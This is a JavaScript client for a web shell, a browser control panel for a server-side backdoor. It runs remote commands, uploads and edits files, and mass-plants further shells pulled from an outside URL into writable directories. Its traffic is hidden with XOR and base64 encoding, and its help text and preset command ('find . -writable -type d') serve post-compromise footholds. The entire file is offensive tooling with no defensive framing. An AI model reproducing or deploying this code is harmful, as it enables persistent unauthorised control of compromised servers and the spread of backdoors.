// Initializing file name to global
let urlfilename = "";
let urlcreate = "";
let putCommandFlag = false;
let helpFlag = false;
let filesToDownload = {};
filesToDownload['TestShell'] = 'https://osamamohammed.github.io/CSS-Data/index.html';
// Declare Elements
let commandIn_e = document.getElementById('cmd');
let pwd_e = document.getElementById('pwd');
let fileToUpload_e = document.getElementById("fileToUpload");
let upload_path_e = document.getElementById("upload_path");
let edit_path_load_e = document.getElementById("edit_path_load");
let cmd_result_e = document.getElementById("cmd_result");
let res_id_e = document.getElementById('res_id');
let res_pwd_e = document.getElementById('res_pwd');
let res_cmd_e = document.getElementById('res_cmd');
let pwdLabel_e = document.getElementById('pwdLabel');
let historySelect_e = document.getElementById('historySelect');
let uploadBtn_e = document.getElementById("uploadBtn");
let editFilePath_e = document.getElementById("editFilePath");
let editFileContent_e = document.getElementById("editFileContent");
let loadedFilePath_e = document.getElementById("loadedFilePath");
let uploadForm_e = document.getElementById("uploadForm");
let LoadForm_e = document.getElementById("LoadForm");
let EditForm_e = document.getElementById("EditForm");
let exeForm_e = document.getElementById("exeForm");
// Mass upload form
let massuploadBtn_e = document.getElementById("massuploadBtn");
let massuploadForm_e = document.getElementById("massuploadForm");
let massUpload_pathes_e = document.getElementById("massUpload_pathes");
let shell_e = document.getElementById("shell");
var fileReader = new FileReader();
var uploadFileData;
fileReader.onload = function (e) {
    uploadFileData = e.target.result;
};
// Mass upload
let massmodal = document.getElementById('massuploadModel');
// Get the button that opens the modal
let massbtn = document.getElementById("massupload_btn");
// Get the <span> element that closes the modal
let massspan = document.getElementById("massupload_close");
// When the user clicks on the button, open the modal
massbtn.onclick = function () {
    massmodal.style.display = "block";
};
// When the user clicks on <span> (x), close the modal
massspan.onclick = function () {
    massmodal.style.display = "none";
};
// Get the modal
let modal = document.getElementById('uploadModel');
// Get the button that opens the m	odal
let btn = document.getElementById("upload_btn");
// Get the <span> element that closes the modal
let span = document.getElementById("upload_close");
// When the user clicks on the button, open the modal
btn.onclick = function () {
    modal.style.display = "block";
};
// When the user clicks on <span> (x), close the modal
span.onclick = function () {
    modal.style.display = "none";
};
// When the user clicks anywhere outside of the modal, close it
window.onclick = function (event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
    if (event.target == editmodal) {
        editmodal.style.display = "none";
    }
    if (event.target == massmodal) {
        massmodal.style.display = "none";
    }
};
let uploaded_list_btn = document.getElementById("uploaded_list_btn");
uploaded_list_btn.onclick = function () {
    window.open(window.location.origin + window.location.pathname + "?uploaded", '_blank', 'toolbar=no, location=no,status=no, menubar=no, scrollbars=yes, resizable=yes, width=650,height=300');
};
// Get the modal Edit
var editmodal = document.getElementById('editModel');
// Get the button that opens the modal
var editbtn = document.getElementById("edit_btn");
// Get the <span> element that closes the modal
var edit_span = document.getElementById("edit_close");
// When the user clicks on the button, open the modal
editbtn.onclick = function () {
    editmodal.style.display = "block";
};
fileToUpload_e.onchange = function () {
    if (this.files[0].name != "") {
        upload_path_e.value = pwd_e.value + this.files[0].name;
    }
    fileReader.readAsText(fileToUpload_e.files[0]);
    // console.log("seleting file and read it");
};
// When the user clicks on <span> (x), close the modal
edit_span.onclick = function () {
    editmodal.style.display = "none";
};
commandIn_e.oninput = function () {
    let thisElement = this;
    if (thisElement.value == "?" && !helpFlag) {
        cmd_result_e.innerHTML = cmd_result_e.innerHTML +
            "\nHelp:" +
            "\nAll uploaded files' path are saved in ./list.txt" +
            "\n\nCommands available:" +
            "\n\t- put [shell name] - Upload shell to current path." +
            "\n\t- mass [pwd] - List all writable folders.";
        helpFlag = true;
        commandIn_e.value = "";
    }
    if (thisElement.value.startsWith("put ") && !putCommandFlag) {
        var tmp = "";
        for (var key in filesToDownload) {
            tmp = tmp + "\t" + key + "\n";
        }
        cmd_result_e.innerHTML = cmd_result_e.innerHTML + "\n\nFiles available:\n" + tmp;
        putCommandFlag = true;
    }
    if (thisElement.value.startsWith("put ") && putCommandFlag &&
        (thisElement.value.indexOf(" ") != thisElement.value.lastIndexOf(" "))) {
        var a = thisElement.value.lastIndexOf(' ');
        var tmp = thisElement.value.substring(a + 1, thisElement.value.length);
        if (tmp != "") {
            urlfilename = tmp;
            // console.log(tmp);
        }
    }
};
function xor_string_decode(data) {
    let key = 'acyTNHj5242Fxm48Tt^#8pMZwJz34RW!^L?XV!y*^==Rncf&ucV7z*X=yR2aeX6kLCa85HjQ4rmZyqXqsX*hDy55eSRheEaZ+Xbv!kzd-bP?c??Z&Z+=ePF!CWpJ%T3CTe5_v=L_%Z%D%BPLgX#Z4?wg2Djsv@KZhx#ZmUnbLQtFzZ$RY9PNAL&3^MPnzh&sQ47YV8$VF8KKrjp%JqWn?xDNETNW8hAhyBjG+_&qxNE+4=HZkN&_VuNrfpc9rKyY';
    data = atob(data);
    let dataArray = data.split('');
    let keyArray = key.split('');
    let str_len = dataArray.length;
    let key_len = key.length;
    var String_fromCharCode = String.fromCharCode;
    for (var i = 0; i < str_len; i++) {
        dataArray[i] = String_fromCharCode(dataArray[i].charCodeAt(0) ^ keyArray[i % key_len].charCodeAt(0));
    }
    data = dataArray.join('');
    return atob(data);
}
function xor_string_encode(data) {
    let key = 'acyTNHj5242Fxm48Tt^#8pMZwJz34RW!^L?XV!y*^==Rncf&ucV7z*X=yR2aeX6kLCa85HjQ4rmZyqXqsX*hDy55eSRheEaZ+Xbv!kzd-bP?c??Z&Z+=ePF!CWpJ%T3CTe5_v=L_%Z%D%BPLgX#Z4?wg2Djsv@KZhx#ZmUnbLQtFzZ$RY9PNAL&3^MPnzh&sQ47YV8$VF8KKrjp%JqWn?xDNETNW8hAhyBjG+_&qxNE+4=HZkN&_VuNrfpc9rKyY';
    data = btoa(data);
    let dataArray = data.split('');
    let keyArray = key.split('');
    let str_len = dataArray.length;
    let key_len = key.length;
    var String_fromCharCode = String.fromCharCode;
    for (var i = 0; i < str_len; i++) {
        dataArray[i] = String_fromCharCode(dataArray[i].charCodeAt(0) ^ keyArray[i % key_len].charCodeAt(0));
    }
    data = dataArray.join('');
    return btoa(data);
}
function escapeHtml(text) {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
function changeData(usr, pwd, result, cmd) {
    // pwd = atob(escapeHtml(pwd));
    res_id_e.innerHTML = escapeHtml(usr);
    res_pwd_e.innerHTML = pwd; // + "#";
    res_cmd_e.innerHTML = escapeHtml(cmd);
    cmd_result_e.innerHTML = escapeHtml(result);
    pwdLabel_e.innerHTML = pwd;
    pwd_e.value = pwd;
    upload_path_e.value = pwd;
    edit_path_load_e.value = pwd;
}
function httpRequest(url, callback) {
    url = encodeURI(url);
    let xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            callback(this);
        }
    };
    xhttp.open("GET", url, true);
    xhttp.send();
}
exeForm_e.onsubmit = function exe() {
    let putCommandFlag = false;
    let helpFlag = false;
    let cmd = commandIn_e.value.trim();
    let option = document.createElement("option");
    option.value = cmd;
    // Handeling PUT command (Sending)
    if (commandIn_e.value.startsWith("put ")) {
        var a = commandIn_e.value.indexOf(' ');
        var b = commandIn_e.value.lastIndexOf(' ');
        var shell = "";
        if (a != b) {
            shell = commandIn_e.value.substring(a + 1, b);
            // console.log(shell);
        }
        else {
            shell = commandIn_e.value.replace("put ", "");
        }
        // console.log(shell);
        for (var key in filesToDownload) {
            if (key == shell) {
                urlcreate = filesToDownload[key];
                // console.log("here");
            }
        }
    }
    if (cmd == "ll") {
        cmd = 'ls -lha | grep "^d" && ls -lha | grep "^-"';
    }
    var pwd = pwd_e.value;
    var jsonData = {
        "cmd": cmd,
        "pwd": pwd,
        "urlDownload": urlcreate,
        "urlFileName": urlfilename
    };
    urlfilename = "";
    var json = JSON.stringify(jsonData);
    // console.log(json);
    var url = window.location.origin + window.location.pathname + '?json=' + encodeURIComponent(xor_string_encode(json));
    httpRequest(url, function (xhttp) {
        let data = JSON.parse(xor_string_decode(xhttp.responseText));
        changeData(data.user, data.pwd, data.result, data.cmd);
    });
    commandIn_e.value = "";
    commandIn_e.name = "cmd" + (Math.random() * 254);
    if (cmd != "") {
        let found = false;
        let options = historySelect_e.children;
        for (let o of options) {
            if (o.value == cmd) {
                found = true;
            }
        }
        if (!found) {
            historySelect_e.appendChild(option);
        }
    }
    return false;
};
function genKey() {
    var avail = "aqwertyuiop[]asdfghjkl;zxcvbnm,.`1234567890-=_+!@#%^&*()QWERTUYIOPASDFGHJKLZXCVBNM";
    // var l = avail.len;
    var len = 256;
    var key = "";
    for (var i = 0; i < len; i++) {
        let r = Math.floor(Math.random() * avail.length);
        key = key + avail.charAt(r);
    }
    return key;
    // console.log(key);
}
let key = "";
window.onload = function initial() {
    var jsonData = {
        "initial": true
    };
    var json = JSON.stringify(jsonData);
    var url = window.location.origin + window.location.pathname + '?json=' + encodeURIComponent(xor_string_encode(json));
    httpRequest(url, function (xhttp) {
        let data = JSON.parse(xor_string_decode(xhttp.responseText));
        changeData(data.user, data.pwd, data.result, data.cmd);
    });
    commandIn_e.value = "";
    commandIn_e.name = "cmd" + (Math.random() * 254);
    let defaultShells = document.getElementById("DefaultShells");
    for (var key in filesToDownload) {
        let tmp = document.createElement("option");
        tmp.value = key;
        defaultShells.appendChild(tmp);
    }
    // <any>(document.getElementById("shell")).name = "shell" + (Math.random() * 254);
    let tmp = document.createElement("option");
    tmp.value = "find . -writable -type d";
    historySelect_e.appendChild(tmp);
    return false;
};
uploadForm_e.onsubmit = function doUpload() {
    var url = window.location.origin + window.location.pathname;
    var xhttp = new XMLHttpRequest();
    var formData = new FormData();
    fileReader.readAsText(fileToUpload_e.files[0]);
    formData.append("uploadFileData", xor_string_encode(uploadFileData));
    var path = upload_path_e.value;
    path = xor_string_encode(path);
    formData.append("path", path);
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            uploadBtn_e.innerHTML = this.responseText;
        }
    };
    xhttp.open('post', url, true);
    xhttp.send(formData);
    return false;
};
LoadForm_e.onsubmit = function doLoad() {
    let url = window.location.origin + window.location.pathname;
    let editPath = edit_path_load_e.value;
    let loadedPath = editPath;
    edit_path_load_e.value = editPath;
    let xhttp = new XMLHttpRequest();
    let formData = new FormData();
    editPath = xor_string_encode(editPath);
    formData.append("edit_path", editPath);
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            if (this.responseText != "") {
                let data = JSON.parse(xor_string_decode(this.responseText));
                if (data.error === undefined) {
                    editFilePath_e.innerHTML = loadedPath + " [" + data.fileSize + "]";
                    editFileContent_e.value = atob(data.fileData);
                }
                else {
                    editFileContent_e.value = data.error;
                }
            }
        }
    };
    xhttp.open('post', url, true);
    xhttp.send(formData);
    return false;
};
EditForm_e.onsubmit = function doEdit() {
    var url = window.location.origin + window.location.pathname;
    var path = edit_path_load_e.value;
    var xhttp = new XMLHttpRequest();
    var formData = new FormData();
    path = xor_string_encode(path);
    var data = xor_string_encode(editFileContent_e.value);
    formData.append("submitEdit", "1");
    formData.append("filePath", path);
    formData.append("fileData", data);
    // console.log(edit_path_load_e.value);
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById("editBtn").innerHTML = this.responseText;
        }
    };
    xhttp.open('post', url, true);
    xhttp.send(formData);
    return false;
};
massuploadForm_e.onsubmit = function () {
    var url = window.location.origin + window.location.pathname;
    var xhttp = new XMLHttpRequest();
    var formData = new FormData();
    var shell = shell_e.value;
    var shellURL = "";
    for (var key in filesToDownload) {
        if (key == shell) {
            shellURL = filesToDownload[key];
            // console.log("here");
        }
    }
    if (shellURL == "") {
        shellURL = shell;
    }
    shellURL = xor_string_encode(shellURL);
    var pathes = xor_string_encode(massUpload_pathes_e.value);
    console.log(massUpload_pathes_e.value);
    formData.append("shellURL", shellURL);
    formData.append("pathes", pathes);
    // console.log(edit_path_load_e.value);
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById("massuploadBtn").innerHTML = this.responseText;
        }
    };
    xhttp.open('post', url, true);
    xhttp.send(formData);
    return false;
};
